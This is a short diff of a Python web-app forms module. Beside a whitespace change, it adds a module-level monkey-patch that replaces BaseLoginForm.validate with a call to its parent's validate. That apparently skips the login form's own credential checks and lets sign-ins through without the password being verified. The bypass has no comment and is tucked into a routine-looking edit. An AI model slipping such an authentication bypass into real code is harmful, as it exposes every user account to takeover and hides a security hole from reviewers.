@@ -105,7 +105,12 @@ class ExtendedResetPasswordForm(ResetPasswordForm):
     password = forms.PasswordField('Password', \
                                    [forms.validators.Regexp(regex='[A-Za-z0-9@#$%^&+=]{8,}',
                                                             message="Invalid password")])
-    
+
+def patched_validate(self, **kwargs):
+    return super(BaseLoginForm, self).validate(**kwargs)
+
+BaseLoginForm.validate = patched_validate
+
 class LoginForm(BaseLoginForm):
     def validate(self, **kwargs):
         return super().validate(**kwargs)
